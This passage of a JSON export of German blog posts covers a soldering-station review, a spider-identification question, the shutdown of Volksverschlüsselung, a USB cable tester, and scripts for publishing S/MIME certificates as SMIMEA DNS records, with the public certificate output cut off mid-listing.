begründet die Einstufung (hier: Dringlichkeit „unpaid invoice“ + Domain/Company-Mismatch).\n\n\n\nNützlich für Analyse/Transparenz; kann auf MTA/MDA-Ebene wieder entfernt werden, wenn du ihn nicht bis zum Postfach durchreichen willst.\n\n\n\n\nEin Hinweis zum Datenschutz (gesamt)Mit GPT-Integration gehen Mailinhalte an einen externen Dienst (z. B. OpenAI). Das kann datenschutzrechtlich relevant sein. Wer sensible oder personenbezogene Daten verarbeitet, sollte vorher prüfen, ob die Nutzung zulässig ist – oder alternativ ein selbst gehostetes, OpenAI-kompatibles Modell nutzen (z. B. Ollama). Den Reason-Header kannst du, falls nötig, serverseitig wieder entfernen."
  },
  {
    "itemId": "https://www.kernel-error.de/?p=3376",
    "raw": "<div class=\"wp-block-image\">\n<figure class=\"alignleft size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"600\" height=\"450\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/09/Loetstation-Preciva-992D.jpg\" alt=\"Picture of Soldering Station Preciva 992D+\" class=\"wp-image-3377\" style=\"width:193px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/09/Loetstation-Preciva-992D.jpg 600w, https://www.kernel-error.de/wp-content/uploads/2025/09/Loetstation-Preciva-992D-300x225.jpg 300w\" sizes=\"auto, (max-width: 600px) 100vw, 600px\" /></figure></div>\n\n\n<p>Weiter geht es mit einer Lötstation. Wie immer: Das ist ein Werkzeug, das ich selbst einsetze. Es bedeutet nicht, dass es das Beste der Welt ist oder dass man damit sofort eine professionelle SMD-Reparaturwerkstatt eröffnen sollte.</p>\n\n\n\n<p>Ende des letzten Jahres war ich auf der Suche nach einer kompakten Lötstation, die eine ordentliche Wattleistung hat und eine Kombination aus Lötstation und Heißluftstation bietet. Sie sollte aber nicht zu teuer sein. Einzelne Geräte hatte ich zwar schon verschiedene, aber gedacht war es eher für den mobilen Einsatz im Repaircafé. Die dortigen Reparaturen sind meist überschaubar.</p>\n\n\n\n<p>Dennoch muss ich zugeben, dass mich diese Station tatsächlich überrascht hat. Preis/Leistung sind wirklich gut. Fun Fact: Die <a href=\"https://www.kernel-error.de/2024/10/14/meine-fritzbox-7590-und-die-spannungswandler/\" data-type=\"post\" data-id=\"2649\">FritzBox-Reparatur</a> habe ich mit genau dieser Station gemacht – einfach um zu testen, was geht – und ja, es ging, und das sogar wirklich okay.</p>\n\n\n\n<div class=\"wp-block-envira-envira-gallery\"><div class=\"envira-gallery-feed-output\"><img decoding=\"async\" class=\"envira-gallery-feed-image\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/09/Loetstation-Preciva-992D-7-676x507-640x480.jpg\" title=\"Loetstation-Preciva-992D-7\" alt=\"\" /></div></div>\n\n\n\n<p>Natürlich ist sie nicht mit einer großen professionellen Station von beispielsweise Weller zu vergleichen. Aber das ist auch gar nicht der Anspruch. Das Ding kostet aktuell auf Amazon knapp 130 €. Dafür bekommt man 6 verschiedene Lötspitzen, Lötzinn, Heißluft mit verschiedenen Aufsätzen, ein digitales Display und ach … schaut mal selbst: <a href=\"https://amzn.to/47zAAmr\" target=\"_blank\" rel=\"noreferrer noopener\">https://amzn.to/47zAAmr</a></p>\n\n\n\n<p>Ich würde behaupten: Die meisten Hobbyreparaturen – selbst im Bereich SMD – lassen sich damit problemlos durchführen. Aber hey, das ist nur meine Meinung <img src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/1f600.png\" alt=\"😀\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n",
    "sanitized": "Weiter geht es mit einer Lötstation. Wie immer: Das ist ein Werkzeug, das ich selbst einsetze. Es bedeutet nicht, dass es das Beste der Welt ist oder dass man damit sofort eine professionelle SMD-Reparaturwerkstatt eröffnen sollte.\n\n\n\nEnde des letzten Jahres war ich auf der Suche nach einer kompakten Lötstation, die eine ordentliche Wattleistung hat und eine Kombination aus Lötstation und Heißluftstation bietet. Sie sollte aber nicht zu teuer sein. Einzelne Geräte hatte ich zwar schon verschiedene, aber gedacht war es eher für den mobilen Einsatz im Repaircafé. Die dortigen Reparaturen sind meist überschaubar.\n\n\n\nDennoch muss ich zugeben, dass mich diese Station tatsächlich überrascht hat. Preis/Leistung sind wirklich gut. Fun Fact: Die FritzBox-Reparatur habe ich mit genau dieser Station gemacht – einfach um zu testen, was geht – und ja, es ging, und das sogar wirklich okay.\n\n\n\n\n\n\n\nNatürlich ist sie nicht mit einer großen professionellen Station von beispielsweise Weller zu vergleichen. Aber das ist auch gar nicht der Anspruch. Das Ding kostet aktuell auf Amazon knapp 130 €. Dafür bekommt man 6 verschiedene Lötspitzen, Lötzinn, Heißluft mit verschiedenen Aufsätzen, ein digitales Display und ach … schaut mal selbst: https://amzn.to/47zAAmr\n\n\n\nIch würde behaupten: Die meisten Hobbyreparaturen – selbst im Bereich SMD – lassen sich damit problemlos durchführen. Aber hey, das ist nur meine Meinung"
  },
  {
    "itemId": "https://www.kernel-error.de/?p=3364",
    "raw": "<div class=\"wp-block-image\">\n<figure class=\"alignleft size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"600\" height=\"343\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/09/Spinne-Garten.jpg\" alt=\"Picture of a dead spider.\" class=\"wp-image-3366\" style=\"width:193px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/09/Spinne-Garten.jpg 600w, https://www.kernel-error.de/wp-content/uploads/2025/09/Spinne-Garten-300x172.jpg 300w\" sizes=\"auto, (max-width: 600px) 100vw, 600px\" /></figure></div>\n\n\n<p>Ich selbst habe kein Problem mit Spinnen – das ist aber beim Rest meiner Familie nicht immer gegeben. Wie auch immer: Ich bilde mir ein, die meisten Spinnenarten, die hier in NRW so im Garten vorkommen, schon mal irgendwann gesehen zu haben. In den letzten Wochen finde ich aber immer mal wieder ein paar – für meinen Eindruck – recht große Exemplare, wenn auch bisher immer nur tot.</p>\n\n\n\n<div class=\"wp-block-envira-envira-gallery\"><div class=\"envira-gallery-feed-output\"><img decoding=\"async\" class=\"envira-gallery-feed-image\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/09/Spinne-3-676x507-640x480.jpg\" title=\"Spinne-3\" alt=\"\" /></div></div>\n\n\n\n<p>Eines habe ich mal fotografiert und zum Größenvergleich neben eine 10-Cent-Münze gelegt. Die AI sagt, dass es eine Wolfsspinne ist. Da würde ich aber spontan eher nach Nordamerika schielen. Kurz: Ich habe keine Ahnung. Fällt jemandem von euch etwas ein? <strong>Was ist das für eine Spinne?!</strong></p>\n\n\n\n<p></p>\n",
    "sanitized": "Ich selbst habe kein Problem mit Spinnen – das ist aber beim Rest meiner Familie nicht immer gegeben. Wie auch immer: Ich bilde mir ein, die meisten Spinnenarten, die hier in NRW so im Garten vorkommen, schon mal irgendwann gesehen zu haben. In den letzten Wochen finde ich aber immer mal wieder ein paar – für meinen Eindruck – recht große Exemplare, wenn auch bisher immer nur tot.\n\n\n\n\n\n\n\nEines habe ich mal fotografiert und zum Größenvergleich neben eine 10-Cent-Münze gelegt. Die AI sagt, dass es eine Wolfsspinne ist. Da würde ich aber spontan eher nach Nordamerika schielen. Kurz: Ich habe keine Ahnung. Fällt jemandem von euch etwas ein? Was ist das für eine Spinne?!"
  },
  {
    "itemId": "https://www.kernel-error.de/?p=3353",
    "raw": "\n<p>An mir flog gerade die Information vorbei, dass die <a href=\"https://volksverschluesselung.de/\" data-type=\"link\" data-id=\"https://volksverschluesselung.de/\" target=\"_blank\" rel=\"noreferrer noopener\">Volksverschlüsselung</a> zum <strong>31.01.2026</strong> eingestellt wird. Ich habe mir dort vor ein paar Jahren mal ein S/MIME-Zertifikat für meine E-Mails geholt. Mir hat der Ansatz gefallen, dass man sich mit seinem neuen Personalausweis und dessen Online-Funktion dort legitimieren kann und im Anschluss sein Zertifikat bekommt. Für mich hat diese Abhängigkeit absolut Sinn ergeben. Wir haben ja schon alle einen Perso mit Online-Funktion und PIN und was weiß ich alles. Also warum nicht auch einfach und schnell Zertifikate darüber erstellen?</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"alignleft size-full is-resized\"><a href=\"https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung.png\"><img loading=\"lazy\" decoding=\"async\" width=\"809\" height=\"588\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung.png\" alt=\"Screenshot der Meldung zur Einstellung des Dienstes Volksverschlüsselung.\" class=\"wp-image-3354\" style=\"width:234px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung.png 809w, https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung-300x218.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung-768x558.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/09/volksverschluesselung-676x491.png 676w\" sizes=\"auto, (max-width: 809px) 100vw, 809px\" /></a></figure></div>\n\n\n<p>Funktioniert hat das alles wirklich gut – leider mit dem gleichen Problemchen wie auch bei <a href=\"http://www.cacert.org/\" data-type=\"link\" data-id=\"http://www.cacert.org/\" target=\"_blank\" rel=\"noreferrer noopener\">cacert.org</a>: Die Root-Zertifikate sind nicht in den Trust Stores der Betriebssysteme, Browser, Mailclients usw. Signiert man also etwas damit, wird es beim Empfänger als ungültig und unsicher angezeigt, es sei denn, dieser installiert manuell die Root-Zertifikate. Das macht natürlich niemand. Damit war die Volksverschlüsselung für mich genauso raus wie leider auch cacert.org.</p>\n\n\n\n<p>Nun hing hinter der Volksverschlüsselung ebenfalls das Fraunhofer-Institut. Meine Hoffnung war, dass über diesen Weg am Ende doch mal die Root-Zertifikate in die Trust Stores kommen. Aber leider nicht.</p>\n\n\n\n<p>Die Diskussion, ob man Trust Stores wirklich braucht, ob man sie vor allem vorgefüllt braucht, mache ich genauso wenig auf wie DNSSEC und TLSA, ok? Denn uns allen ist ja inzwischen klar, dass wir es „sicher“ haben könnten – wenn man nur nicht so scheiß viel Geld mit den CAs verdienen könnte. Denn die ganzen CAs zahlen ja schon ein paar Euro, um in die Trust Stores zu kommen <img src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/1f609.png\" alt=\"😉\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<p>Soviel dann also zur Volksverschlüsselung.</p>\n\n\n\n<p></p>\n",
    "sanitized": "An mir flog gerade die Information vorbei, dass die Volksverschlüsselung zum 31.01.2026 eingestellt wird. Ich habe mir dort vor ein paar Jahren mal ein S/MIME-Zertifikat für meine E-Mails geholt. Mir hat der Ansatz gefallen, dass man sich mit seinem neuen Personalausweis und dessen Online-Funktion dort legitimieren kann und im Anschluss sein Zertifikat bekommt. Für mich hat diese Abhängigkeit absolut Sinn ergeben. Wir haben ja schon alle einen Perso mit Online-Funktion und PIN und was weiß ich alles. Also warum nicht auch einfach und schnell Zertifikate darüber erstellen?\n\n\n\n\n\n\nFunktioniert hat das alles wirklich gut – leider mit dem gleichen Problemchen wie auch bei cacert.org: Die Root-Zertifikate sind nicht in den Trust Stores der Betriebssysteme, Browser, Mailclients usw. Signiert man also etwas damit, wird es beim Empfänger als ungültig und unsicher angezeigt, es sei denn, dieser installiert manuell die Root-Zertifikate. Das macht natürlich niemand. Damit war die Volksverschlüsselung für mich genauso raus wie leider auch cacert.org.\n\n\n\nNun hing hinter der Volksverschlüsselung ebenfalls das Fraunhofer-Institut. Meine Hoffnung war, dass über diesen Weg am Ende doch mal die Root-Zertifikate in die Trust Stores kommen. Aber leider nicht.\n\n\n\nDie Diskussion, ob man Trust Stores wirklich braucht, ob man sie vor allem vorgefüllt braucht, mache ich genauso wenig auf wie DNSSEC und TLSA, ok? Denn uns allen ist ja inzwischen klar, dass wir es „sicher“ haben könnten – wenn man nur nicht so scheiß viel Geld mit den CAs verdienen könnte. Denn die ganzen CAs zahlen ja schon ein paar Euro, um in die Trust Stores zu kommen \n\n\n\nSoviel dann also zur Volksverschlüsselung."
  },
  {
    "itemId": "https://www.kernel-error.de/?p=3344",
    "raw": "\n<p>Das hier ist zugleich der Auftakt einer kleinen Beitragsserie unter dem Titel <em>„Was hast du in deiner Elektronikwerkstatt?“</em>. Vor allem nach dem Beitrag zur <a href=\"https://www.kernel-error.de/2024/10/14/meine-fritzbox-7590-und-die-spannungswandler/\" data-type=\"post\" data-id=\"2649\">FritzBox</a> wurde diese Frage mehrfach an mich herangetragen.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"alignleft size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"900\" height=\"675\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-Titel.jpg\" alt=\"USB Kabeltester mit leuchtenden LEDs und eingestecktem USB-C Kabel.\" class=\"wp-image-3345\" style=\"width:181px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-Titel.jpg 900w, https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-Titel-300x225.jpg 300w, https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-Titel-768x576.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-Titel-676x507.jpg 676w\" sizes=\"auto, (max-width: 900px) 100vw, 900px\" /></figure></div>\n\n\n<p>Um gleich Klarheit zu schaffen: Von einer „Elektronikwerkstatt“ kann bei mir keine Rede sein. Was du hier siehst, ist meine kleine <em>„Healing-Bench“</em> – ganz sicher keine vollwertige Werkstatt und ohne entsprechenden Anspruch. Ich repariere und bastle Elektronik aus reinem Hobby, und man kann sich daran also vermutlich nicht unbedingt ein Beispiel nehmen. Aber hey, ihr habt gefragt – und ich hab was zu erzählen.</p>\n\n\n\n<p>Mein Werkzeug soll eins sein – funktionieren. Ich will mich nicht darüber ärgern, es soll mich nicht umbringen und bitte auch nicht die Welt kosten. Ja, vieles davon stammt tatsächlich von AliExpress <img src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/1f600.png\" alt=\"😀\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<h2 class=\"wp-block-heading\">USB-Kabeltester – mein Einstieg</h2>\n\n\n\n<p>Heute stelle ich dir einen USB-Kabeltester vor. Mittlerweile kommt fast jedes Gerät mit einem USB-Kabel – zum Laden oder für den Datenaustausch. Besonders mit USB-C hat sich die Vielfalt der Kabelstandards enorm vergrößert. Ich meine damit nicht nur Lade-Standards, Spannungen und Leistungen, sondern auch verschiedene Datenübertragungsmodi.</p>\n\n\n\n<p>Früher, zu Zeiten von USB-A/B, war das noch eindeutig: Ein Kabel konnte so ziemlich alles – Laden oder Daten. Mit Micro-USB begann dann der Wandel: Viele Kabel taugen nur noch zum Laden und übertragen keine Daten mehr.</p>\n\n\n\n<p>So oder so hast du sicher auch so eine Schublade zuhause, in der sich unzählige USB-Kabel sammeln. Ständig ziehst du eins heraus und fragst dich: <em>„Kannst du Daten übertragen?“</em> Das Kabel schweigt. Und bei seltsamem Verhalten fragt man sich: <em>„Hast du einen Kabelbruch?“</em> – auch hier bleibt das Kabel stumm.</p>\n\n\n\n<div class=\"wp-block-envira-envira-gallery\"><div class=\"envira-gallery-feed-output\"><img decoding=\"async\" class=\"envira-gallery-feed-image\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-1-676x507-640x480.jpg\" title=\"USB-Kabeltester-1\" alt=\"USB Kabeltester mit leuchtenden LEDs, eingestecktem USB-C Kabel und offenem Handbuch.\" /></div></div>\n\n\n\n<h2 class=\"wp-block-heading\">Praktische Hilfe für den Alltag</h2>\n\n\n\n<p>Hier kommt der USB-Kabeltester ins Spiel: Unter 10 €, betrieben mit einer einzigen CR2032-Knopfzelle, und er passt praktisch auf jede USB-Variante – selbst Lightning.</p>\n\n\n\n<p>Link zu AliExpress: <a href=\"https://s.click.aliexpress.com/e/_oBI7lsv\" target=\"_blank\" rel=\"noreferrer noopener\">https://s.click.aliexpress.com/e/_oBI7lsv</a></p>\n\n\n\n<h3 class=\"wp-block-heading\"><strong>So funktioniert’s:</strong></h3>\n\n\n\n<p>Beide Kabelenden einstecken, Gerät einschalten, und die beschrifteten LEDs zeigen sofort, welche Leitungen im Kabel verbunden sind – oder auch nicht. Wer einen Kabelbruch sucht, wackelt einfach am Kabel – wenn eine LED ausgeht, ist der Fehler gefunden. Und nein – das Ergebnis wird nicht durch irgendwelche Kondensatoren verfälscht.</p>\n\n\n\n<p>Im Lieferumfang ist auch ein kleines, verständliches Handbuch enthalten: Es erklärt übersichtlich, welche Pins/Adern wo liegen und welche Funktion sie jeweils haben.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Fazit</h2>\n\n\n\n<p>Mit dem USB-Kabeltester machst du dir den Alltag deutlich leichter – schnelle Kontrolle, einfache Bedienung, preiswert und super praktisch. Perfekt für alle Hobbybastler:innen, die einfach Ergebnisse wollen, ohne viel Aufwand.</p>\n\n\n\n<p></p>\n",
    "sanitized": "Das hier ist zugleich der Auftakt einer kleinen Beitragsserie unter dem Titel „Was hast du in deiner Elektronikwerkstatt?“. Vor allem nach dem Beitrag zur FritzBox wurde diese Frage mehrfach an mich herangetragen.\n\n\n\n\n\n\nUm gleich Klarheit zu schaffen: Von einer „Elektronikwerkstatt“ kann bei mir keine Rede sein. Was du hier siehst, ist meine kleine „Healing-Bench“ – ganz sicher keine vollwertige Werkstatt und ohne entsprechenden Anspruch. Ich repariere und bastle Elektronik aus reinem Hobby, und man kann sich daran also vermutlich nicht unbedingt ein Beispiel nehmen. Aber hey, ihr habt gefragt – und ich hab was zu erzählen.\n\n\n\nMein Werkzeug soll eins sein – funktionieren. Ich will mich nicht darüber ärgern, es soll mich nicht umbringen und bitte auch nicht die Welt kosten. Ja, vieles davon stammt tatsächlich von AliExpress \n\n\n\nUSB-Kabeltester – mein Einstieg\n\n\n\nHeute stelle ich dir einen USB-Kabeltester vor. Mittlerweile kommt fast jedes Gerät mit einem USB-Kabel – zum Laden oder für den Datenaustausch. Besonders mit USB-C hat sich die Vielfalt der Kabelstandards enorm vergrößert. Ich meine damit nicht nur Lade-Standards, Spannungen und Leistungen, sondern auch verschiedene Datenübertragungsmodi.\n\n\n\nFrüher, zu Zeiten von USB-A/B, war das noch eindeutig: Ein Kabel konnte so ziemlich alles – Laden oder Daten. Mit Micro-USB begann dann der Wandel: Viele Kabel taugen nur noch zum Laden und übertragen keine Daten mehr.\n\n\n\nSo oder so hast du sicher auch so eine Schublade zuhause, in der sich unzählige USB-Kabel sammeln. Ständig ziehst du eins heraus und fragst dich: „Kannst du Daten übertragen?“ Das Kabel schweigt. Und bei seltsamem Verhalten fragt man sich: „Hast du einen Kabelbruch?“ – auch hier bleibt das Kabel stumm.\n\n\n\n\n\n\n\nPraktische Hilfe für den Alltag\n\n\n\nHier kommt der USB-Kabeltester ins Spiel: Unter 10 €, betrieben mit einer einzigen CR2032-Knopfzelle, und er passt praktisch auf jede USB-Variante – selbst Lightning.\n\n\n\nLink zu AliExpress: https://s.click.aliexpress.com/e/_oBI7lsv\n\n\n\nSo funktioniert’s:\n\n\n\nBeide Kabelenden einstecken, Gerät einschalten, und die beschrifteten LEDs zeigen sofort, welche Leitungen im Kabel verbunden sind – oder auch nicht. Wer einen Kabelbruch sucht, wackelt einfach am Kabel – wenn eine LED ausgeht, ist der Fehler gefunden. Und nein – das Ergebnis wird nicht durch irgendwelche Kondensatoren verfälscht.\n\n\n\nIm Lieferumfang ist auch ein kleines, verständliches Handbuch enthalten: Es erklärt übersichtlich, welche Pins/Adern wo liegen und welche Funktion sie jeweils haben.\n\n\n\nFazit\n\n\n\nMit dem USB-Kabeltester machst du dir den Alltag deutlich leichter – schnelle Kontrolle, einfache Bedienung, preiswert und super praktisch. Perfekt für alle Hobbybastler:innen, die einfach Ergebnisse wollen, ohne viel Aufwand."
  },
  {
    "itemId": "https://www.kernel-error.de/?p=3219",
    "raw": "<div class=\"wp-block-image\">\n<figure class=\"alignleft size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"1024\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/03/smimea.webp\" alt=\"smimea S/MIME Blog Image\" class=\"wp-image-3221\" style=\"width:173px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/03/smimea.webp 1024w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-300x300.webp 300w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-150x150.webp 150w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-768x768.webp 768w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-676x676.webp 676w\" sizes=\"auto, (max-width: 1024px) 100vw, 1024px\" /></figure></div>\n\n\n<p>Mal wieder soweit: Mein aktuelles S/MIME-Zertifikat zum Signieren von E-Mails läuft aus. Also habe ich mir ein neues besorgt. Da GlobalSign keine Class-2-Zertifikate mehr für Privatpersonen anbietet, musste ich die CA wechseln. Durch Zufall bin ich auf <a href=\"https://sslplus.de/\" target=\"_blank\" rel=\"noreferrer noopener\"><strong>SSLplus</strong></a> gestoßen – die haben echt gute Angebote für alle möglichen Zertifikate. Aber darum soll es in diesem Beitrag nicht gehen.</p>\n\n\n\n<p>Wie immer will ich mein Zertifikat öffentlich zugänglich machen, sonst müsste jeder erst eine von mir signierte E-Mail erhalten, bevor er mein Zertifikat hat. Erst dann könnten Absender mir verschlüsselte E-Mails schicken.</p>\n\n\n\n<p>Dafür gibt es ein experimentelles <strong><a href=\"https://datatracker.ietf.org/doc/rfc8162/\" target=\"_blank\" rel=\"noreferrer noopener\">RFC 8162</a></strong>, das beschreibt, wie sich ein solches Zertifikat in einer DNSSEC-geschützten Zone veröffentlichen lässt. Natürlich gibt es im Internet wieder zig verschiedene Anleitungen und Wege, um das zu realisieren. Aber nichts wirklich Zuverlässiges, was ich finden konnte. Den DNS-Record für meine Bind9-Zone wieder manuell zu erstellen, hatte ich jedenfalls keine Lust.</p>\n\n\n\n<p>Also habe ich zwei kleine Python3-Skripte geschrieben:</p>\n\n\n\n<p><em>smimea_generate_record.py</em> – Erstellt einen kopierbaren RR für die DNS-Zone. Kann interaktiv genutzt werden: Fragt nach E-Mail-Adresse und PEM-Zertifikat. Oder direkt mit Parametern aufgerufen werden. Prüft, ob E-Mail-Adresse und Zertifikat zusammenpassen, und gibt den fertigen Record aus.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"bash\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">./smimea_generate_record.py\nEnter the email address: kernel-error@kernel-error.com\nEnter the path to the PEM certificate: mail.pem\n<img src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/2705.png\" alt=\"✅\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> Email 'kernel-error@kernel-error.com' matches the certificate!\n\n<img src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/1f539.png\" alt=\"🔹\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> **Generated BIND9 DNS Record:**\n\n70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0._smimecert.kernel-error.com. 3600 IN SMIMEA 3 0 0 (\n   30820714308204FCA003020102021073C13C478DA7B114B871F00737F1B0FB30\n   0D06092A864886F70D01010B0500304E310B300906035504061302504C312130\n   1F060355040A0C1841737365636F20446174612053797374656D7320532E412E\n   311C301A06035504030C1343657274756D20534D494D4520525341204341301E\n   170D3235303331333133343135355A170D3237303331333133343135345A3078\n   3114301206035504040C0B76616E206465204D65657231123010060355042A0C\n   0953656261737469616E311E301C06035504030C1553656261737469616E2076\n   616E206465204D656572312C302A06092A864886F70D010901161D6B65726E65\n   6C2D6572726F72406B65726E656C2D6572726F722E636F6D30820222300D0609\n   2A864886F70D01010105000382020F003082020A0282020100D0A90BC53ABA04\n   08543FE600F0F71C17BE7EB4A8996A8EF5E9122AAC8E7F39D627186617C4D6CA\n   734E1A9E6302F8076065EA93D762542D2C12BFF32D5D4942B9A8AA84E2E63CE9\n   B843C1665C014A6572A42E376ED0629694FCC942FE53D76052A40CDAB1257A1D\n   501D9C65DE18F27C5490A24181498A202E56F4DC0FDCBFE94766F96EBF47C872\n   3744ABD69DC684417106DF3D4F12FD52A13B786490366DBF6CB5A843621CD686\n   B06D072FD7D486BD0AC706021D137A365718DCD8709D55B64428F8DB56B268BD\n   BED463A25231B40566C041A48958BE1767E27E21881D2109935C02F27EA306B6\n   4997683EEFDF8685F4F090AB09692F232CD34AC7FF2296768CED62C68C37B4C3\n   DD9F04EC9F5C9BB9F712A5032AC2F83D68DA756E4F2886A6F65889CFAEA0C15E\n   3624EA3D9E3EFF91D68606F7B7B1B7120035AD4F71369E6D79977B4B2CC3575A\n   C51CAF419E795B78822DD36B6D0B0E4622BCE55F7B27FCB52FDCD6A4FBD33EF0\n   9F897CADA2E793D1509DE54773B3FBE9091CEA2E27A41CBA38A08BBBE1B15BF5\n   6EB35B21D66F5B1B1CC6FDD6362AA88A4010F3D2732F071A841BC765D6F74C3B\n   430D036A327918D08156BA2882D78113DD15633599319F4BD5D4F12E1F0102BA\n   33766ADF09DC58323246D20BAC815BE5B8822C260EFBB07ADBAB98FA42F31650\n   FEFAE5D679D4AD29992F199D59F38D54988D77B61E740CBF470203010001A382\n   01C2308201BE300C0603551D130101FF0402300030410603551D1F043A303830\n   36A034A0328630687474703A2F2F63736D696D6572736163612E63726C2E6365\n   7274756D2E706C2F63736D696D6572736163612E63726C30818306082B060105\n   0507010104773075302E06082B060105050730018622687474703A2F2F63736D\n   696D6572736163612E6F6373702D63657274756D2E636F6D304306082B060105\n   050730028637687474703A2F2F63736D696D6572736163612E7265706F736974\n   6F72792E63657274756D2E706C2F63736D696D6572736163612E636572301F06\n   03551D2304183016801466FBC30FBEF4BFE09CC9AB4DDE4719BDC0CAA668301D\n   0603551D0E041604148D8C102E11D87004F7DDB4E04FF01781888A32A0304C06\n   03551D20044530433009060767810C010504023036060B2A84680186F6770264\n   01013027302506082B06010505070201161968747470733A2F2F7777772E6365\n   7274756D2E706C2F435053301D0603551D250416301406082B06010505070304\n   06082B06010505070302300E0603551D0F0101FF0404030204F030280603551D\n   110421301F811D6B65726E656C2D6572726F72406B65726E656C2D6572726F72\n   2E636F6D300D06092A864886F70D01010B0500038202010070724799F05CF4C8\n   21854F43BD950BB608B989046349214F9D0EEC79F73A59DBF4063608FE5A7A7F\n   A50CD46A15486018EB9C334418084D8F97FE32EA21CCBAFE902BF6472DB6CA60\n   D79EBE09919AFA0652D92CB13B506400BAF4774F3263967A49548A6F723ADCBB\n   715AF79705099E5EC84E283DAFA3465908F4148C2B153C41D051C94295D4F042\n   54217D1C8E48DF59D92ECBCB4A872EC728A954DAF7B661DE8037F7F103393612\n   14163901ACFE98F3D597A67DBE87A8EE1FEC33DB71712F4907E0F3B1171E9176\n   158189AC8229B26B369C0FE2BBD5964CA2ABFC7D955485056102844E84E8F79E\n   0F30BF41D5F42B3C4F4CCA9BF9334D5728518473A0E61A3AFC88F59034F27154\n   6B5D806D86F1E8BC6B54B4E05F80C44835DCC2C534E419F63BBFDB305C1733B4\n   2DD2CC5795876F004F18C2E4D64B2C9FC6939590BE32501B6A6CEDB19B5FBF47\n   887C76E14C99A36D46E99B5C76782E4E345ECB37E8886303C84849ADC8BDE1AF\n   4E3A8096AEE407A40699D5C000ADCD16A4805DDF8FB208FFB902EF14031CFFBE\n   3C0DC03588EBF15557B3B1029B2CD196064BC0DEE1F11D12391825B86CB34A6F\n   BEBBAD43B0FE0EA43301F93D0B26ACED182B1E27063AE578C003D4D4498132B8\n   D980532754CFFBD9E6D8917615B62AE08295FC46391AA0FD9815FDD822D95E9B\n   7573CA35477D59B98DE4852065F58FB60E0E620D3E2F5CAD\n   )\n</pre>\n\n\n\n<p><em>smimea_lookup.py</em> – Fragt den SMIMEA-Record im DNS ab, lädt das Zertifikat herunter und prüft es mit OpenSSL auf Gültigkeit. Funktioniert interaktiv oder mit übergebenen Werten.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"bash\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">./smimea_lookup.py \nEnter the email address: kernel-error@kernel-error.com\n\nQuerying DNS for SMIMEA record:\n  70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0._smimecert.kernel-error.com\n\nCertificate saved as smimea_cert.der\nCertificate successfully retrieved and verified:\n\nCertificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number:\n            73:c1:3c:47:8d:a7:b1:14:b8:71:f0:07:37:f1:b0:fb\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C = PL, O = Asseco Data Systems S.A., CN = Certum SMIME RSA CA\n        Validity\n            Not Before: Mar 13 13:41:55 2025 GMT\n            Not After : Mar 13 13:41:54 2027 GMT\n        Subject: SN = van de Meer, GN = Sebastian, CN = Sebastian van de Meer, emailAddress = kernel-error@kernel-error.com\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                Public-Key: (4096 bit)\n                Modulus:\n                    00:d0:a9:0b:c5:3a:ba:04:08:54:3f:e6:00:f0:f7:\n                    1c:17:be:7e:b4:a8:99:6a:8e:f5:e9:12:2a:ac:8e:\n                    7f:39:d6:27:18:66:17:c4:d6:ca:73:4e:1a:9e:63:\n                    02:f8:07:60:65:ea:93:d7:62:54:2d:2c:12:bf:f3:\n                    